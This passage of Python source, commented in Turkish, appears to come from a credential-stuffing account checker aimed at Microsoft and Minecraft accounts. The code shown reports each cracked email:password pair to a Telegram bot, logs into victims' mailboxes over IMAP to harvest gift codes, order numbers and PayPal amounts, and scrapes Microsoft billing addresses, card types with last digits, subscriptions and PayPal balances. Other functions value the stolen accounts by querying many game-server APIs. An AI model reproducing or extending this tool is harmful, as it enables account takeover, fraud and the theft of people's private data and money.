                if len(unique) < len(lns):
                    with open(fp, 'w', encoding='utf-8') as f_c:
                        f_c.writelines(unique)
                    removed += len(lns) - len(unique)
            except: continue
    return removed

def auto_zip_results(fname):
    try:
        import zipfile
        base_p = f'results/{fname}'
        zip_p  = f'results/{fname}.zip'
        with zipfile.ZipFile(zip_p, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(base_p):
                for fn in files:
                    fp = os.path.join(root, fn)
                    zf.write(fp, os.path.relpath(fp, 'results'))
        return zip_p
    except: return None


# ═══════════════════════════════════════════════════════════════════
# YENI OZELLIKLER BLOGU
# ═══════════════════════════════════════════════════════════════════

# ── PAUSE/RESUME SISTEMI ─────────────────────────────────────────
import threading as _threading_pr
_PAUSED      = False
_PAUSE_LOCK  = _threading_pr.Lock()
_PAUSE_EVENT = _threading_pr.Event()
_PAUSE_EVENT.set()  # başlangıçta çalışır

def toggle_pause():
    global _PAUSED
    with _PAUSE_LOCK:
        _PAUSED = not _PAUSED
        if _PAUSED:
            _PAUSE_EVENT.clear()
            if UI_ENABLED and ui:
                try: ui.log_info('⏸  DURAKLATILDI — devam için P tuşuna bas')
                except: pass
        else:
            _PAUSE_EVENT.set()
            if UI_ENABLED and ui:
                try: ui.log_info('▶  DEVAM EDİYOR...')
                except: pass

def wait_if_paused():
    _PAUSE_EVENT.wait()

def _pause_keyboard_listener():
    """Arka planda P tuşunu dinle."""
    try:
        import readchar as _rc
        while True:
            ch = _rc.readchar()
            if ch in ('p', 'P'):
                toggle_pause()
            elif ch in ('q', 'Q'):
                break
    except: pass

# ── WATERMARK SISTEMI ─────────────────────────────────────────────
import hashlib as _hashlib
import base64 as _b64wm

_WM_KEY = ''

def add_watermark(text, label=''):
    return text

def verify_watermark(text):
    return True

# ── ETA HESAPLAYICI ──────────────────────────────────────────────
def calc_eta(checked, total, start_ts):
    try:
        if checked < 5 or not start_ts: return '...'
        elapsed = time.time() - start_ts
        rate    = checked / elapsed          # combo/saniye
        remain  = (total - checked) / rate   # saniye
        h, m, s = int(remain)//3600, (int(remain)%3600)//60, int(remain)%60
        return f'{h:02d}:{m:02d}:{s:02d}'
    except: return '?'

# ── TELEGRAM BOT ─────────────────────────────────────────────────
def send_telegram(message, parse_mode='HTML'):
    try:
        tg_token = config.get('telegram_bot_token', '')
        tg_chat  = config.get('telegram_chat_id', '')
        if not tg_token or not tg_chat: return False
        url = f'https://api.telegram.org/bot{tg_token}/sendMessage'
        r = requests.post(url, json={
            'chat_id': tg_chat,
            'text': message,
            'parse_mode': parse_mode,
            'disable_web_page_preview': True,
        }, timeout=_safe_t(10))
        return r.status_code == 200
    except: return False

def send_telegram_hit(cap):
    """Hit olunca Telegram'a gönder."""
    try:
        if not config.get('telegram_notify_hits', False): return
        tier = getattr(cap, 'value_tier', 'C')
        score = getattr(cap, 'value_score', 0)
        icons = {'S': '💎', 'A': '🔥', 'B': '⚡', 'C': '·'}
        icon  = icons.get(tier, '·')
        lines = [
            f'{icon} <b>[{tier}-Tier | Score:{score}]</b>',
            f'📧 <code>{cap.email}:{cap.password}</code>',
        ]
        if cap.name and cap.name != 'N/A':
            lines.append(f'🎮 MC: <b>{cap.name}</b>')
        t = getattr(cap, 'type', None)
        if t: lines.append(f'🎮 Type: <b>{t}</b>')
        og = getattr(cap, 'og_name', None)
        if og: lines.append(f'🏆 OG: <b>{og}</b>')
        bal = getattr(cap, 'ms_balance', None)
        if bal and str(bal) not in ('0.00 USD', 'None', ''):
            lines.append(f'💰 Balance: <b>{bal}</b>')
        sub = getattr(cap, 'sub_expiry', None)
        if sub: lines.append(f'📅 Sub Exp: <b>{sub}</b>')
        pms = getattr(cap, 'ms_payment_methods', [])
        if pms: lines.append(f'💳 PM: <b>{", ".join(pms[:3])}</b>')
        guild = getattr(cap, 'guild_name', None)
        if guild: lines.append(f'⚔ Guild: <b>{guild}</b>')
        send_telegram('\n'.join(lines))
    except: pass

# ── IMAP INBOX SCANNER (GELİŞMİŞ) ────────────────────────────────
def scan_imap_inbox(email_addr, password, keywords=None):
    """IMAP ile inbox tara, değerli mailleri bul."""
    if keywords is None:
        kw_str = str(config.get('inbox_keywords', 'steam,netflix,microsoft,minecraft,paypal,amazon'))
        keywords = [k.strip().lower() for k in kw_str.split(',')]
    results = {
        'keywords_found': [],
        'steam_codes':    [],
        'gift_codes':     [],
        'order_ids':      [],
        'paypal_amounts': [],
        'raw_subjects':   [],
    }
    try:
        domain = email_addr.split('@')[-1].lower() if '@' in email_addr else ''
        imap_map = {
            'gmail.com':    ('imap.gmail.com', 993),
            'googlemail.com': ('imap.gmail.com', 993),
            'outlook.com':  ('outlook.office365.com', 993),
            'hotmail.com':  ('outlook.office365.com', 993),
            'live.com':     ('outlook.office365.com', 993),
            'msn.com':      ('outlook.office365.com', 993),
            'yahoo.com':    ('imap.mail.yahoo.com', 993),
            'ymail.com':    ('imap.mail.yahoo.com', 993),
        }
        if domain not in imap_map: return results
        host, port = imap_map[domain]
        import imaplib, ssl as _ssl, email as _email
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE
        imap = imaplib.IMAP4_SSL(host, port, ssl_context=ctx)
        imap.login(email_addr, password)
        imap.select('INBOX', readonly=True)
        max_msgs = int(config.get('max_inbox_messages', 50))
        _, data = imap.search(None, 'ALL')
        ids = data[0].split()
        ids = ids[-max_msgs:] if len(ids) > max_msgs else ids
        for msg_id in reversed(ids):
            try:
                _, raw = imap.fetch(msg_id, '(RFC822)')
                msg = _email.message_from_bytes(raw[0][1])
                subj   = str(msg.get('Subject', '') or '').lower()
                sender = str(msg.get('From', '') or '').lower()
                body   = ''
                if msg.is_multipart():
                    for part in msg.walk():
                        ct = part.get_content_type()
                        if ct in ('text/plain', 'text/html'):
                            try:
                                body += part.get_payload(decode=True).decode('utf-8', errors='ignore')
                            except: pass
                else:
                    try:
                        body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
                    except: pass
                full_text = (subj + ' ' + sender + ' ' + body).lower()
                # Keyword tespiti
                for kw in keywords:
                    if kw in full_text and kw not in results['keywords_found']:
                        results['keywords_found'].append(kw)
                # Steam kodları
                for m in re.finditer(r'[A-Z0-9]{5}-[A-Z0-9]{5}-[A-Z0-9]{5}', body):
                    if m.group() not in results['steam_codes']:
                        results['steam_codes'].append(m.group())
                # Genel gift/promo kodları
                for m in re.finditer(r'\b[A-Z0-9]{4,6}-[A-Z0-9]{4,6}-[A-Z0-9]{4,6}\b', body):
                    c = m.group()
                    if c not in results['gift_codes'] and c not in results['steam_codes']:
                        results['gift_codes'].append(c)
                # Sipariş numaraları
                for m in re.finditer(r'order[#\s:]+([A-Z0-9\-]{6,20})', full_text, re.I):
                    if m.group(1) not in results['order_ids']:
                        results['order_ids'].append(m.group(1))
                # PayPal tutarlar
                for m in re.finditer(r'\$(\d+\.\d{2})', body):
                    if 'paypal' in sender or 'paypal' in subj:
                        results['paypal_amounts'].append(m.group())
                # Konu listesi (değerlilere)
                if any(kw in full_text for kw in ['steam', 'paypal', 'gift', 'code', 'order']):
                    orig_subj = str(msg.get('Subject', ''))[:60]
                    if orig_subj and orig_subj not in results['raw_subjects']:
                        results['raw_subjects'].append(orig_subj)
            except: continue
        imap.logout()
    except Exception: pass
    return results

# ── GEÇMİŞ SİPARİŞ TARAMA (Microsoft) ───────────────────────────
def fetch_order_history(session):
    try:
        r = session.get('https://account.microsoft.com/billing/orders',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(12))
        orders = []
        # JSON formatı
        for pat in [r'"productTitle"\s*:\s*"([^"]+)"',
                    r'"itemName"\s*:\s*"([^"]+)"',
                    r'"description"\s*:\s*"([^"]{5,60})"']:
            for m in re.finditer(pat, r.text, re.I):
                item = m.group(1).strip()[:50]
                if item and item not in orders:
                    orders.append(item)
        return orders[:10] if orders else None
    except: return None

# ── LINKED ACCOUNTS (Steam/EA/Epic) ──────────────────────────────
def fetch_linked_accounts(session):
    found = []
    try:
        r = session.get('https://account.microsoft.com/privacy/app-access',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        txt = r.text.lower()
        if 'steam'    in txt: found.append('Steam')
        if 'ea'       in txt or 'electronic arts' in txt: found.append('EA/Origin')
        if 'epic'     in txt: found.append('Epic')
        if 'discord'  in txt: found.append('Discord')
        if 'spotify'  in txt: found.append('Spotify')
        if 'netflix'  in txt: found.append('Netflix')
        if 'twitch'   in txt: found.append('Twitch')
        if 'nintendo' in txt: found.append('Nintendo')
    except: pass
    return found if found else None

# ── HYPIXEL GUILD ────────────────────────────────────────────────
def fetch_hypixel_guild(username):
    try:
        r = requests.get(
            f'https://api.hypixel.net/guild?player={username}',
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=_safe_t(8), verify=False)
        if r.status_code == 200:
            d = r.json()
            g = d.get('guild')
            if g:
                gname = g.get('name', '')
                members = g.get('members', [])
                for mem in members:
                    if str(mem.get('uuid', '')).lower() in username.lower():
                        rank = mem.get('rank', 'Member')
                        return f'{gname} [{rank}] ({len(members)} üye)'
                return f'{gname} ({len(members)} üye)'
        # Fallback: Plancke API (no key)
        r2 = requests.get(f'https://plancke.io/hypixel/player/stats/{username}',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(8), verify=False)
        m = re.search(r'Guild[:\s]+([^\n<"]{3,40})', r2.text, re.I)
        if m: return m.group(1).strip()[:40]
    except: pass
    return None

# ── HYPIXEL EK STATS (SW Prestige, MM, BB) ───────────────────────
def parse_extra_hypixel_stats(stats_text):
    """stats_text: meowapi'den gelen ham metin."""
    result = {}
    try:
        # SkyWars Prestige
        for pat in [r'SkyWars[^:]*Prestige[:\s]+([^\n|,]{2,20})',
                    r'sw[_\s]prestige[:\s]+([^\n|,]{2,15})']:
            m = re.search(pat, stats_text, re.I)
            if m: result['sw_prestige'] = m.group(1).strip(); break
        # SkyWars Stars
        for pat in [r'SkyWars[^:]*(?:Star|Level)[:\s]+(\d+)',
                    r'sw[_\s](?:star|level)[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['sw_stars'] = m.group(1); break
        # Murder Mystery
        for pat in [r'Murder[^\n]*[Kk]ill[:\s]+(\d+)',
                    r'mm[_\s]kills?[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['mm_kills'] = m.group(1); break
        for pat in [r'Murder[^\n]*[Ww]in[:\s]+(\d+)',
                    r'mm[_\s]wins?[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['mm_wins'] = m.group(1); break
        # Build Battle
        for pat in [r'Build[^\n]*[Ss]core[:\s]+(\d+)',
                    r'bb[_\s]score[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['bb_score'] = m.group(1); break
        for pat in [r'Build[^\n]*[Ww]in[:\s]+(\d+)',
                    r'bb[_\s]wins?[:\s]+(\d+)']:
            m = re.search(pat, stats_text, re.I)
            if m: result['bb_wins'] = m.group(1); break
    except: pass
    return result

# ── MINECRAFT BEDROCK ────────────────────────────────────────────
def fetch_bedrock_info(session):
    try:
        # Xbox profile = Bedrock identity
        r = session.get(
            'https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,UniqueModernGamertag,GameDisplayPicRaw',
            headers={'User-Agent': 'Mozilla/5.0', 'x-xbl-contract-version': '3'},
            timeout=_safe_t(10))
        if r.status_code == 200:
            d = r.json()
            setts = {s.get('id'): s.get('value') for s in d.get('profileUsers', [{}])[0].get('settings', [])}
            tag  = setts.get('Gamertag') or setts.get('UniqueModernGamertag')
            pfp  = setts.get('GameDisplayPicRaw')
            if tag: return {'gamertag': tag, 'pfp': pfp}
    except: pass
    return None

# ── NAMEMC FAVORİLER ─────────────────────────────────────────────
def fetch_namemc_favorites(username):
    try:
        r = requests.get(f'https://namemc.com/profile/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept-Language': 'en-US,en;q=0.9'},
            timeout=_safe_t(8), verify=False)
        m = re.search(r'(\d[\d,]+)\s*(?:people\s+)?favor', r.text, re.I)
        if m:
            return m.group(1).replace(',', '')
        # Backup: search için sayfa
        r2 = requests.get(f'https://namemc.com/search?q={username}',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(6), verify=False)
        m2 = re.search(r'(\d+)\s*favorit', r2.text, re.I)
        if m2: return m2.group(1)
    except: pass
    return None

# ── OPTIFINE DETAY ───────────────────────────────────────────────
def fetch_optifine_detail(username):
    try:
        r = requests.get(f'https://optifine.net/adloadx?f=OptiFine_{username}',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(6), verify=False)
        if r.status_code != 200: return None
        ver_m = re.search(r'OptiFine[_\s]([A-Za-z0-9_.]+)', r.text)
        date_m = re.search(r'(\d{4}-\d{2}-\d{2})', r.text)
        parts = []
        if ver_m: parts.append(f'v{ver_m.group(1)}')
        if date_m: parts.append(f'since:{date_m.group(1)}')
        return ' '.join(parts) if parts else 'Active'
    except: pass
    return None

# ── CRAFATAR AVATAR URL ──────────────────────────────────────────
def get_crafatar_url(uuid):
    if not uuid or uuid == 'N/A': return None
    clean = str(uuid).replace('-', '')
    return f'https://crafatar.com/avatars/{clean}?size=128&overlay'

# ── PAYPAL BAKİYE ────────────────────────────────────────────────
def fetch_paypal_balance(session):
    try:
        # PayPal genellikle OAuth gerektirir, basit scrape dene
        r = session.get('https://www.paypal.com/myaccount/summary',
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0'},
            timeout=_safe_t(10), allow_redirects=True)
        for pat in [r'\$\s*(\d+\.\d{2})\s*USD',
                    r'"totalBalance"\s*:\s*"?(\d+\.\d{2})"?',
                    r'balance["\s:]+\$?(\d+\.\d{2})']:
            m = re.search(pat, r.text, re.I)
            if m and float(m.group(1)) >= 0:
                return f'${m.group(1)} USD'
    except: pass
    return None

# ── KREDİ KARTI TİPİ ────────────────────────────────────────────
_CC_PATTERNS = [
    (r'\b4[0-9]{3}[\s\-]?[Xx*]{4}[\s\-]?[Xx*]{4}[\s\-]?([0-9]{4})\b', 'Visa'),
    (r'\b5[1-5][0-9]{2}[\s\-]?[Xx*]{4}[\s\-]?[Xx*]{4}[\s\-]?([0-9]{4})\b', 'Mastercard'),
    (r'\b3[47][0-9]{2}[\s\-]?[Xx*]{6}[\s\-]?([0-9]{5})\b', 'Amex'),
    (r'\b6(?:011|5[0-9]{2})[Xx*0-9\s\-]{8,}([0-9]{4})\b', 'Discover'),
    (r'"cardType"\s*:\s*"([^"]+)"', None),
    (r'"network"\s*:\s*"([^"]+)"', None),
]

def parse_cc_types(text):
    found = []
    for pat, cc_type in _CC_PATTERNS:
        for m in re.finditer(pat, text, re.I):
            val = cc_type if cc_type else m.group(1).title()
            last4 = m.group(1) if len(m.groups()) >= 1 else ''
            entry = f'{val}(*{last4})' if last4 and last4.isdigit() else val
            if entry not in found:
                found.append(entry)
    return found if found else None

# ── FATURA ADRESİ DETAYI ─────────────────────────────────────────
def fetch_billing_address_detail(session):
    try:
        for url in ['https://account.microsoft.com/billing/addresses',
                    'https://account.microsoft.com/profile']:
            r = session.get(url, headers={'User-Agent': 'Mozilla/5.0'},
                timeout=_safe_t(10))
            city_m    = re.search(r'"city"\s*:\s*"([^"]+)"', r.text, re.I)
            zip_m     = re.search(r'"postalCode"\s*:\s*"([^"]+)"', r.text, re.I)
            country_m = re.search(r'"countryCode"\s*:\s*"([A-Z]{2})"', r.text)
            parts = []
            if country_m: parts.append(country_m.group(1))
            if city_m:    parts.append(city_m.group(1)[:20])
            if zip_m:     parts.append(zip_m.group(1)[:10])
            if parts: return '-'.join(parts)
    except: pass
    return None

# ── MS POINTS → PARA DEĞERİ ─────────────────────────────────────
def points_to_money(points_str):
    try:
        pts = int(re.sub(r'[^\d]', '', str(points_str)))
        # Microsoft: 1000 puan ≈ $1.00 USD
        usd = pts / 1000.0
        if usd > 0: return f'{pts}pts (≈${usd:.2f})'
    except: pass
    return points_str

# ── AKTİF ABONELİK LİSTESİ ──────────────────────────────────────
def fetch_active_subscriptions(session):
    try:
        r = session.get('https://account.microsoft.com/services',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(10))
        subs = []
        for pat in [r'"productName"\s*:\s*"([^"]+)"',
                    r'"subscriptionName"\s*:\s*"([^"]+)"',
                    r'"displayName"\s*:\s*"([^"]{5,50})"']:
            for m in re.finditer(pat, r.text, re.I):
                name = m.group(1).strip()[:40]
                if name and name not in subs:
                    subs.append(name)
        return subs[:8] if subs else None
    except: return None


# ═══════════════════════════════════════════════════════════════════
# YENI API'LER BLOGU v2
# ═══════════════════════════════════════════════════════════════════

# ── CAPE API'LERİ ────────────────────────────────────────────────

def fetch_capes_dev(uuid):
    """Capes.dev - OF, 5zig, LabyMod, MC, Optifine tüm cape türleri."""
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://api.capes.dev/load/{fmt}',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        found = []
        cape_checks = {
            'optifine':   'Optifine', 'labymod': 'LabyMod', 'fivezig': '5zig',
            'mccapes':    'MC', 'tlauncher': 'TLauncher', 'minecraftcapes': 'MinecraftCapes',
            'wynn':       'Wynncraft', 'cosmetica': 'Cosmetica',
        }
        for key, label in cape_checks.items():
            cape_data = d.get(key)
            if isinstance(cape_data, dict) and cape_data.get('exists'):
                found.append(label)
            elif cape_data is True:
                found.append(label)
        return ', '.join(found) if found else None
    except: return None

def fetch_labymod_profile(uuid):
    """LabyMod rank, cosmetics, premium."""
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://laby.net/api/v3/user/{fmt}/profile',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        role = d.get('role_name') or d.get('role') or ''
        if role and role.lower() not in ('user', '', 'none'): parts.append(f'Role:{role}')
        if d.get('has_premium') or d.get('isPremium'): parts.append('Premium')
        cosmetics = d.get('cosmetics') or []
        if isinstance(cosmetics, list) and cosmetics: parts.append(f'Cosmetics:{len(cosmetics)}')
        badges = d.get('badges') or d.get('labymod_badges') or []
        if badges: parts.append(f'Badges:{len(badges)}')
        cape = d.get('cape') or d.get('active_cape')
        if cape: parts.append('Cape')
        return ' | '.join(parts) if parts else 'Registered'
    except: return None

def fetch_badlion_profile(username):
    """Badlion cape, rank, ban info."""
    try:
        r = requests.get(f'https://api.badlion.net/user/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200:
            # Fallback scrape
            r2 = requests.get(f'https://client.badlion.net/user/{username}',
                headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(6), verify=False)
            if r2.status_code != 200: return None
            txt = r2.text
            parts = []
            if 'banned' in txt.lower(): parts.append('Banned')
            rank_m = re.search(r'rank["\s:]+([A-Z]+)', txt, re.I)
            if rank_m: parts.append(f'Rank:{rank_m.group(1)}')
            return ' | '.join(parts) if parts else 'Registered'
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('role') or ''
        if rank and rank.lower() not in ('none', '', 'default'): parts.append(f'Rank:{rank}')
        if d.get('banned'): parts.append('⛔Banned')
        if d.get('cape') or d.get('has_cape'): parts.append('Cape')
        cosmetics = d.get('cosmetics', {})
        if cosmetics: parts.append(f'Cosmetics:{len(cosmetics)}')
        return ' | '.join(parts) if parts else 'Registered'
    except: return None

def fetch_tlauncher_cape(uuid):
    """TLauncher cape kontrolü."""
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        for url in [
            f'https://auth.tlauncher.org/skin/profile/texture/login/{fmt}',
            f'https://tlauncher.org/api/cape/{fmt}',
        ]:
            try:
                r = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'},
                    timeout=_safe_t(6), verify=False)
                if r.status_code == 200 and r.text.strip():
                    d = r.json() if r.headers.get('Content-Type','').startswith('application/json') else {}
                    if d.get('CAPE') or d.get('cape') or 'cape' in r.text.lower():
                        return 'TLauncher Cape'
            except: continue
        return None
    except: return None

def fetch_5zig_cape(uuid):
    """5zig cape kontrolü."""
    try:
        if not uuid or uuid == 'N/A': return None
        c = str(uuid).replace('-', '')
        fmt = f'{c[:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:]}'
        r = requests.get(f'https://textures.5zig.net/user/{fmt}',
            headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(5), verify=False)
        if r.status_code == 200:
            if 'cape' in r.text.lower() or len(r.content) > 100:
                return 'Yes'
        return None
    except: return None

def fetch_mineskin_info(username):
    """MineSkin skin değeri ve rarity."""
    try:
        r = requests.get(f'https://api.mineskin.org/search/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(6), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        skins = d.get('skins') or d.get('data') or []
        if not skins: return None
        skin = skins[0] if isinstance(skins, list) else skins
        parts = []
        views = skin.get('views') or skin.get('usage_count', 0)
        if views: parts.append(f'Views:{views}')
        name_skin = skin.get('name') or ''
        if name_skin: parts.append(f'Name:{name_skin[:20]}')
        return ' | '.join(parts) if parts else 'Listed'
    except: return None

# ── SUNUCU API'LERİ ──────────────────────────────────────────────

def fetch_mineplex_stats(username):
    """Mineplex level, rank, oyun istatistikleri."""
    for url in [
        f'https://api.mineplex.com/pc/player/{username}',
        f'https://www.mineplex.com/api/player/{username}',
    ]:
        try:
            r = requests.get(url,
                headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                timeout=_safe_t(7), verify=False)
            if r.status_code != 200: continue
            d = r.json()
            parts = []
            rank = d.get('rank') or d.get('level_name') or ''
            if rank and rank not in ('Player', '', None): parts.append(f'Rank:{rank}')
            level = d.get('level') or d.get('stat_level')
            if level: parts.append(f'Lvl:{level}')
            gems  = d.get('gems')
            coins = d.get('coins')
            if gems:  parts.append(f'Gems:{format_number(gems)}')
            if coins: parts.append(f'Coins:{format_number(coins)}')
            return ' | '.join(parts) if parts else None
        except: continue
    return None

def fetch_wynncraft_stats(username):
    """Wynncraft guild, class, total XP, playtime."""
    try:
        r = requests.get(f'https://api.wynncraft.com/v3/player/{username}?fullResult=True',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(8), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        if not d: return None
        parts = []
        guild = d.get('guild', {})
        if guild and guild.get('name'): parts.append(f'Guild:{guild["name"]}')
        rank = d.get('rank') or d.get('supportRank') or ''
        if rank and rank not in ('Player', '', None): parts.append(f'Rank:{rank}')
        playtime = d.get('playtime')
        if playtime: parts.append(f'Time:{playtime}h')
        chars = d.get('characters', {})
        if chars:
            total_lvl = sum(c.get('level', 0) for c in chars.values() if isinstance(c, dict))
            if total_lvl: parts.append(f'TotalLvl:{total_lvl}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_hive_stats(username):
    """Hive tüm oyun istatistikleri."""
    try:
        r = requests.get(f'https://api.playhive.com/v0/game/all/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        if not d: return None
        parts = []
        for game, data in list(d.items())[:4]:
            if not isinstance(data, dict): continue
            w = data.get('victories', 0) or data.get('wins', 0) or 0
            k = data.get('kills', 0) or 0
            if int(w) > 0 or int(k) > 0:
                parts.append(f'{game.upper()[:3]}:{k}K/{w}W')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_pika_stats(username):
    """PikaNetwork rank, kills, wins."""
    try:
        r = requests.get(f'https://stats.pika-network.net/api/profile/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank = d.get('rank') or d.get('highest_rank') or ''
        if rank and rank not in ('Default', '', None): parts.append(f'Rank:{rank}')
        kdr  = d.get('kdr') or d.get('kill_death_ratio')
        if kdr: parts.append(f'KDR:{kdr}')
        # Divisions
        divs = d.get('divisions') or []
        if divs and isinstance(divs, list): parts.append(f'Divs:{len(divs)}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_gommehd_stats(username):
    """GommeHD istatistikleri."""
    try:
        r = requests.get(f'https://gommeapi.gommeservices.com/player/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200:
            # Plancke fallback scrape
            r2 = requests.get(f'https://www.gommehd.net/api/player/{username}',
                headers={'User-Agent': 'Mozilla/5.0'}, timeout=_safe_t(6), verify=False)
            if r2.status_code != 200: return None
            d = r2.json()
        else:
            d = r.json()
        parts = []
        rank = d.get('rank') or d.get('player_rank') or ''
        if rank and rank not in ('Spieler', 'Player', '', None): parts.append(f'Rank:{rank}')
        coins = d.get('coins') or d.get('currency')
        if coins: parts.append(f'Coins:{format_number(coins)}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_mineheroes_stats(username):
    """Mineheroes rank, kills, killstreak."""
    try:
        r = requests.get(f'https://mineheroes.net/api/users/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        parts = []
        rank  = d.get('rank') or ''
        level = d.get('level')
        ks    = d.get('killstreak') or d.get('highest_killstreak')
        if rank and rank not in ('default', 'member', '', None): parts.append(f'Rank:{rank}')
        if level: parts.append(f'Lvl:{level}')
        if ks:    parts.append(f'KS:{ks}')
        return ' | '.join(parts) if parts else None
    except: return None

def fetch_minemen_stats(username):
    """Minemen Practice PvP istatistikleri."""
    try:
        for url in [
            f'https://minemenclub.com/api/players/{username}',
            f'https://api.minemenclub.com/player/{username}',
        ]:
            try:
                r = requests.get(url,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
                    timeout=_safe_t(7), verify=False)
                if r.status_code != 200: continue
                d = r.json()
                parts = []
                elo = d.get('elo') or d.get('rank_elo')
                wins= d.get('wins') or d.get('globalWins')
                kdr = d.get('kdr')
                if elo:  parts.append(f'ELO:{elo}')
                if wins: parts.append(f'Wins:{wins}')
                if kdr:  parts.append(f'KDR:{kdr}')
                return ' | '.join(parts) if parts else None
            except: continue
        return None
    except: return None

# ── KEY-FREE APIs ────────────────────────────────────────────────

def fetch_playerdb(username):
    """PlayerDB - UUID + cached profil, Mojang API yedeği."""
    try:
        r = requests.get(f'https://playerdb.co/api/player/minecraft/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(7), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        player = d.get('data', {}).get('player', {})
        if not player: return None
        return {
            'uuid':     player.get('id'),
            'username': player.get('username'),
            'raw_id':   player.get('raw_id'),
        }
    except: return None

def fetch_slothpixel_stats(username):
    """Slothpixel - BW/SW/Duels/MM tam stats."""
    try:
        r = requests.get(
            f'https://api.slothpixel.me/api/players/{username}',
            headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'},
            timeout=_safe_t(10), verify=False)
        if r.status_code != 200: return None
        d = r.json()
        if d.get('error') or d.get('cause'): return None
        parts = []
        rank = (d.get('rank') or d.get('packageRank') or '').strip()
        if rank and rank.upper() not in ('NON','','NORMAL','DEFAULT','NONE'):
            parts.append(f'Rank:{rank}')
        lvl = d.get('level')
        if lvl: parts.append(f'Lvl:{round(float(lvl),1)}')
        karma = d.get('karma', 0)
        if karma: parts.append(f'Karma:{format_number(karma)}')
        games = d.get('stats') or d.get('games') or {}
        # BedWars
        bw = games.get('Bedwars') or games.get('bedwars') or {}
        bw_stars = bw.get('level') or bw.get('stars') or bw.get('star') or 0
        bw_fk    = bw.get('final_kills_bedwars') or bw.get('final_kills') or 0
        bw_wins  = bw.get('wins_bedwars') or bw.get('wins') or 0
        bw_fd    = bw.get('final_deaths_bedwars') or bw.get('final_deaths') or 1
        bw_kdr   = round(int(bw_fk) / max(int(bw_fd), 1), 2) if bw_fk else 0
        if bw_stars or bw_wins:
            parts.append(f'BW[★{bw_stars} FK:{format_number(int(bw_fk or 0))} W:{format_number(int(bw_wins or 0))} FKDR:{bw_kdr}]')
        # SkyWars
        sw = games.get('SkyWars') or games.get('skywars') or {}
        sw_lvl   = sw.get('level_formatted') or sw.get('level') or sw.get('skywars_level') or 0
        sw_kills = sw.get('kills') or 0
        sw_wins  = sw.get('wins') or 0
        sw_deaths= sw.get('deaths') or 1
        sw_kdr   = round(int(sw_kills) / max(int(sw_deaths), 1), 2) if sw_kills else 0
        if sw_lvl or sw_wins:
            parts.append(f'SW[Lvl:{sw_lvl} K:{format_number(int(sw_kills or 0))} W:{format_number(int(sw_wins or 0))} KDR:{sw_kdr}]')
        # Duels
        duels = games.get('Duels') or games.get('duels') or {}
        d_wins = duels.get('wins') or 0
        d_div  = duels.get('best_overall_division') or duels.get('division') or ''
